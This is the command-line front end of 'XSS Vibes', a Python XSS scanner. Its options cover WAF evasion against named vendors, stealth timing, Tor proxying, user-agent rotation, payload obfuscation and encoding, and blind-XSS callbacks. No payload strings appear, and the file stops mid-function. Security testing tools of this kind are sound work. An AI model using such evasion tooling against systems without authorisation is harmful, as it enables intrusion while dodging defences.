#!/usr/bin/env python3
"""
XSS Vibes CLI - Modern XSS Scanner with Click interface.
"""

import asyncio
import logging
import sys
from datetime import datetime
from pathlib import Path
from typing import List, Optional

import click
from colorama import Fore, Style, init as colorama_init

# Add parent directory to path for imports
current_dir = Path(__file__).parent
sys.path.insert(0, str(current_dir))

from .config import ScannerConfig
from .logger import setup_logging
from .models import ScanResult, VulnerabilityLevel
from .payload_manager import PayloadManager
from .scanner import XSSScanner
from .waf_detector import WAFDetector
from .output_manager import OutputManager
from .integrations import ParameterDiscovery, install_tools
from .advanced_reporting import AdvancedReporter, ReportConfig
from .payload_mutation import PayloadMutationEngine, InjectionContext, MutationType
from .session_manager import SessionManager, LoginCredentials, SessionConfig, AuthMethod
from .knoxss_integration import (
    KnoxSSConfig,
    knoxss_config_status,
    generate_personalized_payloads,
    knoxss_scan_target,
)
from .rate_limit import (
    RateLimiter,
    RateLimitConfig,
    create_stealth_rate_limiter,
    create_normal_rate_limiter,
    create_aggressive_rate_limiter,
)

# Initialize colorama
colorama_init(autoreset=True)

logger = logging.getLogger("xss_vibes.cli")


def print_banner():
    """Print the XSS Vibes banner."""
    banner = f"""
{Fore.RED}
 ██╗  ██╗███████╗███████╗    ██╗   ██╗██╗██████╗ ███████╗███████╗
 ╚██╗██╔╝██╔════╝██╔════╝    ██║   ██║██║██╔══██╗██╔════╝██╔════╝
  ╚███╔╝ ███████╗███████╗    ██║   ██║██║██████╔╝█████╗  ███████╗
  ██╔██╗ ╚════██║╚════██║    ╚██╗ ██╔╝██║██╔══██╗██╔══╝  ╚════██║
 ██╔╝ ██╗███████║███████║     ╚████╔╝ ██║██████╔╝███████╗███████║
 ╚═╝  ╚═╝╚══════╝╚══════╝      ╚═══╝  ╚═╝╚═════╝ ╚══════╝╚══════╝
{Style.RESET_ALL}
{Fore.CYAN}          Modern XSS Scanner v2.0.0 with WAF Evasion{Style.RESET_ALL}
{Fore.YELLOW}               Enhanced by AI - Built for Professionals{Style.RESET_ALL}
"""
    click.echo(banner)


@click.group(invoke_without_command=True)
@click.option("--version", is_flag=True, help="Show version and exit")
@click.pass_context
def cli(ctx, version):
    """XSS Vibes - Modern XSS Scanner with WAF evasion capabilities."""
    if version:
        click.echo("XSS Vibes v2.0.0")
        return

    if ctx.invoked_subcommand is None:
        print_banner()
        click.echo("Use 'xss-vibes scan --help' to see scanning options")
        click.echo("Use 'xss-vibes payloads --help' to manage payloads")


@cli.command()
@click.argument("urls", nargs=-1, required=True)
@click.option("-u", "--url", "single_url", help="Single URL to scan")
@click.option(
    "-l",
    "--list",
    "url_list",
    type=click.Path(exists=True),
    help="File containing URLs to scan",
)
@click.option("-c", "--cookie", help="Cookie string to use")
@click.option(
    "-H",
    "--header",
    "headers",
    multiple=True,
    help='Custom header (format: "Name: Value")',
)
@click.option("--user-agent", help="Custom User-Agent string")
@click.option("--threads", type=int, default=1, help="Number of threads (1-10)")
@click.option("--timeout", type=int, default=10, help="Request timeout in seconds")
@click.option("--delay", type=float, default=0, help="Delay between requests")
@click.option(
    "--mode",
    type=click.Choice(["sync", "async"]),
    default="async",
    help="Scanning mode",
)
@click.option("--waf-mode", is_flag=True, help="Enable WAF-specific evasion payloads")
@click.option(
    "--target-waf",
    type=click.Choice(
        [
            "cloudflare",
            "akamai",
            "imperva",
            "f5",
            "barracuda",
            "sucuri",
            "modsecurity",
            "wordfence",
            "aws-waf",
        ]
    ),
    help="Target specific WAF for optimized payload selection",
)
@click.option("--custom-waf", help="Custom WAF name")
@click.option("--no-waf-detect", is_flag=True, help="Disable WAF detection")
@click.option(
    "--level",
    type=click.Choice(["low", "medium", "high", "critical"]),
    help="Minimum vulnerability level to report",
)
@click.option("--output", "-o", type=click.Path(), help="Output file (JSON/HTML/TXT)")
@click.option(
    "--format",
    "output_format",
    type=click.Choice(["json", "html", "txt", "csv", "markdown"]),
    default="txt",
    help="Output format",
)
@click.option(
    "--report-format",
    type=click.Choice(["html", "json", "csv", "markdown"]),
    help="Advanced report format",
)
@click.option("--report-title", default="XSS Security Assessment", help="Report title")
@click.option(
    "--include-payloads/--no-include-payloads",
    default=True,
    help="Include payloads in report",
)
@click.option(
    "--include-technical/--no-include-technical",
    default=True,
    help="Include technical details in report",
)
@click.option(
    "--executive-summary/--no-executive-summary",
    default=True,
    help="Include executive summary",
)
@click.option(
    "--log-level",
    type=click.Choice(["DEBUG", "INFO", "WARNING", "ERROR"]),
    default="INFO",
    help="Logging level",
)
@click.option("--log-file", type=click.Path(), help="Log file path")
@click.option("--no-colors", is_flag=True, help="Disable colored output")
@click.option("--proxy", help="Proxy URL (http://proxy:port or socks5://proxy:port)")
@click.option("--burp", is_flag=True, help="Use Burp Suite proxy (127.0.0.1:8080)")
@click.option("--tor", is_flag=True, help="Use Tor proxy (127.0.0.1:9050)")
@click.option(
    "--verify-ssl/--no-verify-ssl", default=True, help="Verify SSL certificates"
)
@click.option(
    "--follow-redirects/--no-follow-redirects",
    default=True,
    help="Follow HTTP redirects",
)
@click.option("--dry-run", is_flag=True, help="Show configuration without scanning")
@click.option("--arjun", is_flag=True, help="Use Arjun for parameter discovery")
@click.option(
    "--paramspider",
    is_flag=True,
    help="Use ParamSpider for archive parameter collection",
)
@click.option(
    "--discovery-only",
    is_flag=True,
    help="Only run parameter discovery, skip XSS scanning",
)
@click.option("--random-ua", is_flag=True, help="Use random User-Agent for requests")
@click.option(
    "--ua-type",
    type=click.Choice(["browser", "security", "bot", "any"]),
    default="browser",
    help="Type of random User-Agent to use",
)
@click.option("--rotate-ua", is_flag=True, help="Rotate User-Agent for each request")
# Rate limiting and stealth options
@click.option("--rate-limit", type=float, help="Requests per second (e.g., 5.0)")
@click.option(
    "--stealth", is_flag=True, help="Enable stealth mode (very slow but evasive)"
)
@click.option(
    "--aggressive", is_flag=True, help="Enable aggressive mode (fast but detectable)"
)
@click.option(
    "--adaptive", is_flag=True, help="Enable adaptive rate limiting based on responses"
)
@click.option("--jitter", is_flag=True, help="Add random jitter to request timing")
@click.option(
    "--min-delay",
    type=float,
    default=2.0,
    help="Minimum delay in stealth mode (seconds)",
)
@click.option(
    "--max-delay",
    type=float,
    default=8.0,
    help="Maximum delay in stealth mode (seconds)",
)
# Advanced encoding options
@click.option(
    "--encoding", is_flag=True, help="Enable advanced payload encoding for WAF evasion"
)
@click.option(
    "--encoding-types",
    multiple=True,
    help="Specific encoding types to use (url, unicode, base64, etc.)",
)
@click.option(
    "--encoding-variants",
    type=int,
    default=5,
    help="Number of encoding variants per payload",
)
@click.option(
    "--context-aware",
    is_flag=True,
    help="Use context-aware encoding based on injection point",
)
@click.option(
    "--high-evasion", is_flag=True, help="Use only high-evasion payloads and techniques"
)
# New advanced options
@click.option(
    "--blind", is_flag=True, help="Enable blind XSS testing with callback URL"
)
@click.option(
    "--callback-url",
    help="Callback URL for blind XSS detection (e.g., https://yourserver.com/callback)",
)
@click.option("--obfuscate", is_flag=True, help="Enable payload obfuscation")
@click.option(
    "--encoding-level",
    type=click.Choice(["1", "2", "3"]),
    default="1",
    help="Encoding level: 1=basic, 2=advanced, 3=maximum evasion",
)
@click.option(
    "--enhanced-payloads",
    is_flag=True,
    help="Enable enhanced payload database (2800+ payloads)",
)
@click.option(
    "--payload-category",
    type=click.Choice(
        [
            "basic_xss",
            "advanced_evasion",
            "waf_bypass",
            "event_handlers",
            "encoded_payloads",
            "javascript_protocols",
            "svg_based",
            "iframe_based",
            "dom_manipulation",
            "polyglot",
            "blind_xss",
            "polyglot_xsspre",
        ]
    ),
    help="Use specific enhanced payload category",
)
@click.option("--mutation", is_flag=True, help="Enable intelligent payload mutation")
@click.option(
    "--mutation-generations",
    type=int,
    default=5,
    help="Number of mutation generations for genetic algorithm",
)
@click.option(
    "--enhanced-payloads",
    is_flag=True,
    help="Use enhanced payload database (2800+ payloads)",
)
@click.option(
    "--payload-category",
    type=click.Choice(
        [
            "basic_xss",
            "advanced_evasion",
            "waf_bypass",
            "event_handlers",
            "encoded_payloads",
            "javascript_protocols",
            "svg_based",
            "iframe_based",
            "dom_manipulation",
            "polyglot",
            "blind_xss",
            "polyglot_xsspre",
        ]
    ),
    help="Enhanced payload category to use",
)
# Session management options
@click.option("--login-url", help="Login URL for authenticated scanning")
@click.option("--username", help="Username for authentication")
@click.option("--password", help="Password for authentication")
@click.option(
    "--auth-type",
    type=click.Choice(["form", "basic", "digest", "bearer"]),
    default="form",
    help="Authentication type",
)
@click.option("--session-profile", help="Load session profile from file")
@click.option("--cookie-jar", help="Cookie jar file for session persistence")
def scan(
    urls,
    single_url,
    url_list,
    cookie,
    headers,
    user_agent,
    threads,
    timeout,
    delay,
    mode,
    waf_mode,
    target_waf,
    custom_waf,
    no_waf_detect,
    level,
    output,
    output_format,
    report_format,
    report_title,
    include_payloads,
    include_technical,
    executive_summary,
    log_level,
    log_file,
    no_colors,
    proxy,
    burp,
    tor,
    verify_ssl,
    follow_redirects,
    dry_run,
    arjun,
    paramspider,
    discovery_only,
    random_ua,
    ua_type,
    rotate_ua,
    # Rate limiting parameters
    rate_limit,
    stealth,
    aggressive,
    adaptive,
    jitter,
    min_delay,
    max_delay,
    # Encoding parameters
    encoding,
    encoding_types,
    encoding_variants,
    context_aware,
    high_evasion,
    # New advanced parameters
    blind,
    callback_url,
    obfuscate,
    encoding_level,
    enhanced_payloads,
    payload_category,
    mutation,
    mutation_generations,
    # Session management parameters
    login_url,
    username,
    password,
    auth_type,
    session_profile,
    cookie_jar,
):
    """Scan URLs for XSS vulnerabilities."""

    if not no_colors:
        print_banner()

    # Setup logging
    try:
        setup_logging(
            level=getattr(logging, log_level),
            log_file=Path(log_file) if log_file else None,
            enable_colors=not no_colors,
        )
    except Exception as e:
        click.echo(f"Logging setup error: {e}")
        logging.basicConfig(level=logging.INFO)

    # Collect URLs
    target_urls = []

    if single_url:
        target_urls.append(single_url)

    if urls:
        target_urls.extend(urls)

    if url_list:
        with open(url_list, "r") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    target_urls.append(line)

    if not target_urls:
        click.echo(f"{Fore.RED}Error: No URLs provided{Style.RESET_ALL}", err=True)
        return

    # Setup rate limiter
    rate_limiter = None
    if stealth:
        rate_limiter = create_stealth_rate_limiter()
        click.echo(
            f"{Fore.YELLOW}🕶️  Stealth mode enabled - very slow but evasive{Style.RESET_ALL}"
        )
    elif aggressive:
        rate_limiter = create_aggressive_rate_limiter()
        click.echo(
            f"{Fore.RED}🚀 Aggressive mode enabled - fast but detectable{Style.RESET_ALL}"
        )
    elif rate_limit:
        config_data = RateLimitConfig(
            requests_per_second=rate_limit,
            adaptive_timing=adaptive,
            jitter_enabled=jitter,
            min_delay=min_delay,
            max_delay=max_delay,
        )
        rate_limiter = RateLimiter(config_data)
        click.echo(f"{Fore.CYAN}⚡ Rate limiting: {rate_limit} req/s{Style.RESET_ALL}")

    # Setup configuration
    config = ScannerConfig(
        max_threads=min(threads, 10),
        default_timeout=timeout,
        verify_ssl=verify_ssl,
        burp_proxy=burp,
        use_tor=tor,
        random_user_agent=random_ua,
        user_agent_type=ua_type,
        rotate_user_agent=rotate_ua,
        custom_user_agent=user_agent,
        rate_limiter=rate_limiter,
    )

    # Setup proxy configuration
    if proxy:
        if proxy.startswith("socks5://"):
            config.proxy_http = proxy
            config.proxy_https = proxy
        else:
            config.proxy_http = proxy
            config.proxy_https = proxy

    # Display proxy info
    if config.burp_proxy:
        click.echo(
            f"{Fore.YELLOW}🔗 Using Burp Suite proxy: 127.0.0.1:8080{Style.RESET_ALL}"
        )
    elif config.use_tor:
        click.echo(f"{Fore.YELLOW}🧅 Using Tor proxy: 127.0.0.1:9050{Style.RESET_ALL}")
    elif proxy:
        click.echo(f"{Fore.YELLOW}🔗 Using custom proxy: {proxy}{Style.RESET_ALL}")

    # Add custom headers to config
    custom_headers = {}
    if headers:
        custom_headers = dict(h.split(":", 1) for h in headers)

    # Setup session manager for authentication
    session_manager = None
    if login_url or session_profile or username:
        session_config = SessionConfig(
            timeout=timeout,
            verify_ssl=verify_ssl,
            cookie_jar_file=cookie_jar,
            headers=custom_headers,
        )
        session_manager = SessionManager(session_config)

        # Configure authentication
        if session_profile:
            # Load from profile (future enhancement)
            click.echo(
                f"{Fore.CYAN}🔐 Session profile not yet implemented{Style.RESET_ALL}"
            )
        elif login_url and username and password:
            credentials = LoginCredentials(
                username=username, password=password, login_url=login_url
            )

            auth_method = AuthMethod(type=auth_type, credentials=credentials)

            click.echo(
                f"{Fore.CYAN}🔐 Authenticating with {auth_type} method...{Style.RESET_ALL}"
            )
            if session_manager.authenticate(auth_method):
                click.echo(f"{Fore.GREEN}✅ Authentication successful{Style.RESET_ALL}")
            else:
                click.echo(f"{Fore.RED}❌ Authentication failed{Style.RESET_ALL}")
                if not click.confirm("Continue without authentication?"):
                    return
    if user_agent and not random_ua:
        config.default_headers = config.default_headers or {}
        config.default_headers["User-Agent"] = user_agent

    # Parse custom headers
    custom_headers = {}
    if cookie:
        custom_headers["Cookie"] = cookie

    for header in headers:
        if ":" in header:
            name, value = header.split(":", 1)
            custom_headers[name.strip()] = value.strip()

    # Initialize components
    payload_manager = PayloadManager()
    waf_detector = WAFDetector()
    scanner = XSSScanner(config, payload_manager, waf_detector)

    # Display payload statistics
    standard_count = payload_manager.payload_count
    waf_count = payload_manager.waf_payload_count
    enhanced_count = payload_manager.enhanced_payload_count

    if enhanced_payloads:
        click.echo(f"{Fore.CYAN}🧬 Enhanced Payloads Mode Enabled{Style.RESET_ALL}")
        click.echo(f"📊 Loaded {enhanced_count} enhanced payloads")
        if payload_category:
            category_payloads = payload_manager.get_enhanced_payloads(
                category=payload_category
            )
            click.echo(
                f"🎯 Using category '{payload_category}': {len(category_payloads)} payloads"
            )
    else:
        click.echo(
            f"📊 Loaded {standard_count} standard + {waf_count} WAF-specific payloads"
        )
        click.echo(
            f"💡 Use --enhanced-payloads for {enhanced_count} additional payloads"
        )

    # Initialize parameter discovery if requested
    enhanced_targets = target_urls.copy()
    discovery_results = {}

    if arjun or paramspider:
        param_discovery = ParameterDiscovery(config)

        # Check tool availability
        tools_status = install_tools()

        if arjun and not tools_status.get("arjun", False):
            click.echo(
                f"{Fore.RED}❌ Arjun not available. Install with: pip3 install arjun{Style.RESET_ALL}"
            )

        if paramspider and not tools_status.get("paramspider", False):
            click.echo(
                f"{Fore.RED}❌ ParamSpider not available. Install with: pip3 install paramspider{Style.RESET_ALL}"
            )

        # Run parameter discovery on first URL as example
        if target_urls and (arjun or paramspider):
            click.echo(f"{Fore.CYAN}🔍 Running parameter discovery...{Style.RESET_ALL}")

            try:
                # Run parameter discovery in async context
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)

                discovery_results = loop.run_until_complete(
                    param_discovery.discover_all_parameters(
                        target_urls[0], use_archives=paramspider
                    )
                )

                if discovery_results.get("enhanced_targets"):
                    enhanced_targets.extend(discovery_results["enhanced_targets"])
                    click.echo(
                        f"{Fore.GREEN}✅ Found {len(discovery_results['enhanced_targets'])} additional targets{Style.RESET_ALL}"
                    )
                else:
                    click.echo(
                        f"{Fore.YELLOW}ℹ️  No additional parameters discovered{Style.RESET_ALL}"
                    )

            except Exception as e:
                click.echo(
                    f"{Fore.RED}❌ Parameter discovery failed: {e}{Style.RESET_ALL}"
                )

    # Update target URLs with enhanced targets
    target_urls = list(set(enhanced_targets))  # Remove duplicates

    # Setup advanced payload features
    mutation_engine = None
    blind_generator = None

    if mutation:
        click.echo(
            f"{Fore.CYAN}🧬 Initializing payload mutation engine...{Style.RESET_ALL}"
        )
        mutation_engine = PayloadMutationEngine()
        click.echo(
            f"{Fore.GREEN}✅ Mutation engine ready with {len(mutation_engine.mutation_rules)} rules{Style.RESET_ALL}"
        )

    if blind and callback_url:
        click.echo(f"{Fore.CYAN}🔍 Setting up blind XSS testing...{Style.RESET_ALL}")
        # blind_generator = BlindPayloadGenerator(callback_url)  # Will implement this
        click.echo(
            f"{Fore.GREEN}✅ Blind XSS configured with callback: {callback_url}{Style.RESET_ALL}"
        )
    elif blind and not callback_url:
        click.echo(
            f"{Fore.RED}❌ Blind XSS requires --callback-url parameter{Style.RESET_ALL}"
        )
        return

    # Apply encoding level configuration
    if encoding or encoding_level != "1":
        level_map = {
            "1": {"types": ["url", "html"], "variants": 3},
            "2": {"types": ["url", "html", "unicode", "base64"], "variants": 5},
            "3": {
                "types": [
                    "url",
                    "html",
                    "unicode",
                    "base64",
                    "utf7",
                    "fromcharcode",
                    "eval",
                ],
                "variants": 8,
            },
        }

        if encoding_level in level_map:
            level_config = level_map[encoding_level]
            if not encoding_types:
                encoding_types = level_config["types"]
            if encoding_variants == 5:  # Default value
                encoding_variants = level_config["variants"]

            click.echo(
                f"{Fore.CYAN}🎭 Encoding level {encoding_level}: {len(encoding_types)} types, {encoding_variants} variants{Style.RESET_ALL}"
            )

    # Dry run - show configuration and exit
    if dry_run:
        click.echo(f"{Fore.CYAN}🔧 Configuration Preview{Style.RESET_ALL}")
        click.echo(f"   URLs to scan: {len(target_urls)}")
        click.echo(f"   Threads: {config.max_threads}")
        click.echo(f"   Timeout: {config.default_timeout}s")
        click.echo(f"   Mode: {mode}")
        click.echo(f"   WAF mode: {'enabled' if waf_mode else 'disabled'}")
        if config.burp_proxy:
            click.echo(f"   Proxy: Burp Suite (127.0.0.1:8080)")
        elif config.use_tor:
            click.echo(f"   Proxy: Tor (127.0.0.1:9050)")
        elif proxy:
            click.echo(f"   Proxy: {proxy}")
        else:
            click.echo(f"   Proxy: None")
        click.echo(
            f"   Payloads: {payload_manager.payload_count} standard + {payload_manager.waf_payload_count} WAF-specific"
        )
        if arjun or paramspider:
            click.echo(
                f"   Parameter discovery: {'enabled' if arjun or paramspider else 'disabled'}"
            )
        if random_ua:
            current_ua = config.get_user_agent()
            click.echo(f"   User-Agent: Random ({ua_type}) - {current_ua[:50]}...")
        elif user_agent:
            click.echo(f"   User-Agent: Custom - {user_agent[:50]}...")
        else:
            click.echo(f"   User-Agent: Default")
        return

    # Discovery only mode - show results and exit
    if discovery_only:
        if discovery_results:
            click.echo(f"{Fore.GREEN}🔍 Parameter Discovery Results:{Style.RESET_ALL}")

            if discovery_results.get("arjun_params"):
                click.echo(
                    f"   🎯 Arjun discovered: {', '.join(discovery_results['arjun_params'])}"
                )

            if discovery_results.get("archive_urls"):
                click.echo(
                    f"   🕷️  Archive URLs found: {len(discovery_results['archive_urls'])}"
                )
                for url in discovery_results["archive_urls"][:10]:  # Show first 10
                    click.echo(f"      {url}")
                if len(discovery_results["archive_urls"]) > 10:
                    click.echo(
                        f"      ... and {len(discovery_results['archive_urls']) - 10} more"
                    )

            if discovery_results.get("enhanced_targets"):
                click.echo(
                    f"   📈 Enhanced targets: {len(discovery_results['enhanced_targets'])}"
                )
                for target in discovery_results["enhanced_targets"][:5]:  # Show first 5
                    click.echo(f"      {target}")
                if len(discovery_results["enhanced_targets"]) > 5:
                    click.echo(
                        f"      ... and {len(discovery_results['enhanced_targets']) - 5} more"
                    )
        else:
            click.echo(
                f"{Fore.YELLOW}ℹ️  No parameter discovery was run. Use --arjun or --paramspider{Style.RESET_ALL}"
            )
        return

    click.echo(f"{Fore.CYAN}🚀 Starting XSS scan...{Style.RESET_ALL}")
    click.echo(
        f"📊 Loaded {payload_manager.payload_count} standard + {payload_manager.waf_payload_count} WAF-specific payloads"
    )

    # Handle advanced encoding if requested
    if encoding or high_evasion or context_aware:
        click.echo(
            f"{Fore.MAGENTA}🔐 Generating advanced encoded payloads...{Style.RESET_ALL}"
        )

        # Import encoding types
        from .encoding_engine import EncodingType

        encoding_type_map = {
            "url": EncodingType.URL,
            "double_url": EncodingType.DOUBLE_URL,
            "html": EncodingType.HTML_ENTITIES,
            "unicode": EncodingType.UNICODE,
            "hex": EncodingType.HEX,
            "octal": EncodingType.OCTAL,
            "base64": EncodingType.BASE64,
            "utf7": EncodingType.UTF7,
            "utf16": EncodingType.UTF16,
            "json": EncodingType.JSON_UNICODE,
            "css": EncodingType.CSS_ENCODING,
            "js": EncodingType.JAVASCRIPT_ENCODING,
            "mixed": EncodingType.MIXED_CASE,
            "char_sub": EncodingType.CHARACTER_SUBSTITUTION,
            "comments": EncodingType.COMMENT_INSERTION,
            "whitespace": EncodingType.WHITESPACE_MANIPULATION,
            "concat": EncodingType.CONCATENATION,
            "eval": EncodingType.EVAL_ENCODING,
            "fromcharcode": EncodingType.FROMCHARCODE,
        }

        if high_evasion:
            # Generate high-evasion payloads
            encoded_payloads = payload_manager.get_high_evasion_payloads(
                waf_type=target_waf, max_count=100
            )
            click.echo(f"   🎯 Generated {len(encoded_payloads)} high-evasion payloads")

        elif encoding_types:
            # Use specific encoding types
            selected_types = []
            for enc_type in encoding_types:
                if enc_type in encoding_type_map:
                    selected_types.append(encoding_type_map[enc_type])
                else:
                    click.echo(
                        f"{Fore.YELLOW}⚠️  Unknown encoding type: {enc_type}{Style.RESET_ALL}"
                    )

            if selected_types:
                encoded_payloads = payload_manager.generate_encoded_payloads(
                    encoding_types=selected_types, max_variants=encoding_variants
                )
                click.echo(
                    f"   🔐 Generated {len(encoded_payloads)} encoded variants using {len(selected_types)} techniques"
                )

        else:
            # Generate automatic encoding variants
            encoded_payloads = payload_manager.generate_encoded_payloads(
                max_variants=encoding_variants
            )
            click.echo(
                f"   🔄 Generated {len(encoded_payloads)} automatic encoding variants"
            )

        # Add encoded payloads to scanner (we'll need to modify scanner to accept additional payloads)
        # For now, we'll show the count
        click.echo(f"   ✅ Enhanced payload arsenal with advanced encoding techniques")

    if waf_mode:
        click.echo(f"{Fore.YELLOW}🛡️  WAF evasion mode enabled{Style.RESET_ALL}")

    if target_waf:
        click.echo(f"{Fore.YELLOW}🎯 Targeting WAF: {target_waf}{Style.RESET_ALL}")

    # Run scans
    results = []

    if mode == "async":
        results = asyncio.run(
            scan_urls_async(
                scanner,
                target_urls,
                custom_headers,
                not no_waf_detect,
                custom_waf,
                waf_mode,
                target_waf,
            )
        )
    else:
        for url in target_urls:
            click.echo(f"{Fore.BLUE}🔍 Scanning: {url}{Style.RESET_ALL}")
            result = scanner.scan_url_sync(
                url,
                custom_headers,
                not no_waf_detect,
                custom_waf,
                waf_mode,
                target_waf,
                enhanced_payloads,
                payload_category,
            )
            results.append(result)

    # Filter results by level
    if level:
        min_level = VulnerabilityLevel(level)
        filtered_results = []
        for result in results:
            if result.vulnerabilities:
                filtered_results.append(result)
        results = filtered_results

    # Output results
    output_manager = OutputManager()

    # Generate advanced report if requested
    if report_format and output:
        try:
            report_config = ReportConfig(
                include_payloads=include_payloads,
                include_technical_details=include_technical,
                include_recommendations=executive_summary,
            )

            reporter = AdvancedReporter(report_config)

            # Generate the advanced report
            report_path = reporter.generate_comprehensive_report(
                results, report_format, output
            )
            click.echo(
                f"{Fore.GREEN}✅ Advanced report saved to: {report_path}{Style.RESET_ALL}"
            )

        except Exception as e:
            click.echo(
                f"{Fore.RED}❌ Failed to generate advanced report: {e}{Style.RESET_ALL}"
            )
            logger.error(f"Report generation failed: {e}")

    elif output:
        # Simple JSON output for backward compatibility
        import json

        json_data = [
            {"url": r.target.url, "vulnerabilities": len(r.vulnerabilities)}
            for r in results
        ]
        with open(output, "w") as f:
            json.dump(json_data, f, indent=2)
        click.echo(f"{Fore.GREEN}✅ Results saved to: {output}{Style.RESET_ALL}")
    else:
        # Simple console output
        for result in results:
            click.echo(f"\n{Fore.CYAN}🔍 URL: {result.target.url}{Style.RESET_ALL}")
            if result.vulnerabilities:
                for vuln in result.vulnerabilities:
                    level_color = {
                        "low": Fore.WHITE,
                        "medium": Fore.YELLOW,
                        "high": Fore.MAGENTA,
                        "critical": Fore.RED,
                    }.get(vuln.level.value, Fore.WHITE)
                    click.echo(
                        f"   {level_color}🚨 {vuln.level.value.upper()}: {vuln.payload}{Style.RESET_ALL}"
                    )
            else:
                click.echo(
                    f"   {Fore.GREEN}✅ No vulnerabilities found{Style.RESET_ALL}"
                )

    # Summary
    total_vulns = sum(len(r.vulnerabilities) for r in results)
    vulnerable_urls = len([r for r in results if r.vulnerabilities])

    click.echo(f"\n{Fore.CYAN}📈 Scan Summary:{Style.RESET_ALL}")
    click.echo(f"   URLs scanned: {len(target_urls)}")
    click.echo(f"   Vulnerable URLs: {vulnerable_urls}")
    click.echo(f"   Total vulnerabilities: {total_vulns}")


async def scan_urls_async(
    scanner, urls, headers, detect_waf, custom_waf, waf_mode, target_waf
):
    """Scan multiple URLs asynchronously."""
    tasks = []

    for url in urls:
        task = scanner.scan_url_async(
            url, headers, detect_waf, custom_waf, waf_mode, target_waf
        )
        tasks.append(task)

    results = await asyncio.gather(*tasks, return_exceptions=True)

    # Handle exceptions
    final_results = []
    for i, result in enumerate(results):
        if isinstance(result, Exception):
            logger.error(f"Error scanning {urls[i]}: {result}")
            continue
        final_results.append(result)

    return final_results


@cli.command()
@click.option("--list", "list_payloads", is_flag=True, help="List all payloads")
@click.option("--waf", help="Filter payloads by WAF type")
@click.option(
    "--level",
    type=click.Choice(["low", "medium", "high", "critical"]),
    help="Filter payloads by level",
)
@click.option("--add", help="Add new payload")
@click.option("--description", help="Description for new payload")
@click.option("--payload-waf", help="WAF type for new payload")
@click.option(
    "--payload-level",
    type=click.Choice(["low", "medium", "high", "critical"]),
    default="medium",
    help="Level for new payload",
)
@click.option("--count", is_flag=True, help="Show payload counts")
def payloads(
    list_payloads, waf, level, add, description, payload_waf, payload_level, count
):
    """Manage XSS payloads."""

    payload_manager = PayloadManager()

    if count:
        click.echo(f"{Fore.CYAN}📊 Payload Statistics:{Style.RESET_ALL}")
        click.echo(f"   Standard payloads: {payload_manager.payload_count}")
        click.echo(f"   WAF-specific payloads: {payload_manager.waf_payload_count}")
        click.echo(f"   Total payloads: {payload_manager.total_payload_count}")

        waf_types = payload_manager.get_waf_types()
        click.echo(f"\n🛡️  WAF Types ({len(waf_types)}):")
        for waf_type in waf_types:
            waf_payloads = payload_manager.get_all_payloads_combined(waf_type=waf_type)
            click.echo(f"   {waf_type}: {len(waf_payloads)} payloads")
        return

    if add:
        level_obj = VulnerabilityLevel(payload_level)
        payload = payload_manager.add_payload(add, payload_waf, description, level_obj)
        payload_manager.save_payloads()
        click.echo(f"{Fore.GREEN}✅ Added payload: {add}{Style.RESET_ALL}")
        return

    if list_payloads:
        payloads = payload_manager.get_all_payloads_combined(waf_type=waf)

        if level:
            level_obj = VulnerabilityLevel(level)
            payloads = [p for p in payloads if p.level == level_obj]

        click.echo(f"{Fore.CYAN}📋 Payloads ({len(payloads)}):{Style.RESET_ALL}")
        for i, payload in enumerate(payloads[:50], 1):  # Limit to 50
            waf_info = f" [{payload.waf}]" if payload.waf else ""
            level_color = {
                "low": Fore.WHITE,
                "medium": Fore.YELLOW,
                "high": Fore.MAGENTA,
                "critical": Fore.RED,
            }.get(payload.level.value, Fore.WHITE)

            click.echo(
                f"   {i:2d}. {level_color}{payload.level.value.upper()}{Style.RESET_ALL}{waf_info}"
            )
            click.echo(f"       {payload.content}")
            if payload.description:
                click.echo(
                    f"       {Fore.GREEN}Description: {payload.description}{Style.RESET_ALL}"
                )
            click.echo()

        if len(payloads) > 50:
            click.echo(f"   ... and {len(payloads) - 50} more payloads")


@cli.command()
@click.argument("url")
@click.option("--timeout", type=int, default=5, help="Detection timeout")
def detect_waf(url, timeout):
    """Detect WAF protection on a URL."""

    click.echo(f"{Fore.CYAN}🔍 Detecting WAF for: {url}{Style.RESET_ALL}")

    waf_detector = WAFDetector()
    detected_waf = waf_detector.detect_waf(url, timeout)

    if detected_waf:
        click.echo(f"{Fore.RED}🛡️  WAF Detected: {detected_waf}{Style.RESET_ALL}")
    else:
        click.echo(f"{Fore.GREEN}✅ No WAF detected{Style.RESET_ALL}")


@cli.command()
@click.argument("results_file", type=click.Path(exists=True))
@click.option(
    "--format",
    "report_format",
    type=click.Choice(["html", "json", "csv", "markdown"]),
    default="html",
    help="Report format",
)
@click.option(
    "--output", "-o", type=click.Path(), required=True, help="Output file path"
)
@click.option("--title", default="XSS Security Assessment", help="Report title")
@click.option(
    "--include-payloads/--no-include-payloads",
    default=True,
    help="Include payloads in report",
)
@click.option(
    "--include-technical/--no-include-technical",
    default=True,
    help="Include technical details",
)
@click.option(
    "--include-recommendations/--no-include-recommendations",
    default=True,
    help="Include recommendations",
)
def generate_report(
    results_file,
    report_format,
    output,
    title,
    include_payloads,
    include_technical,
    include_recommendations,
):
    """Generate advanced security report from scan results."""

    import json

    try:
        # Load results from file
        with open(results_file, "r") as f:
            data = json.load(f)

        # Convert to ScanResult objects (simplified for demo)
        results = []
        # This would need proper parsing based on your JSON structure

        # Configure report
        config = ReportConfig(
            include_payloads=include_payloads,
            include_technical_details=include_technical,
            include_recommendations=include_recommendations,
        )

        reporter = AdvancedReporter(config)
        report_path = reporter.generate_comprehensive_report(
            results, report_format, output
        )

        click.echo(f"{Fore.GREEN}✅ Report generated: {report_path}{Style.RESET_ALL}")

    except Exception as e:
        click.echo(f"{Fore.RED}❌ Failed to generate report: {e}{Style.RESET_ALL}")
        sys.exit(1)


@cli.command("install-tools")
def install_tools_cmd():
    """Check and show installation status of integration tools."""
    click.echo(f"{Fore.CYAN}🔧 Checking Integration Tools{Style.RESET_ALL}")

    tools_status = install_tools()

    for tool, available in tools_status.items():
        status_icon = "✅" if available else "❌"
        status_text = "Available" if available else "Not found"
        click.echo(f"   {status_icon} {tool.capitalize()}: {status_text}")

    if not tools_status.get("arjun", False):
        click.echo(f"\n{Fore.YELLOW}📦 To install Arjun:{Style.RESET_ALL}")
        click.echo("   pip3 install arjun")

    if not tools_status.get("paramspider", False):
        click.echo(f"\n{Fore.YELLOW}📦 To install ParamSpider:{Style.RESET_ALL}")
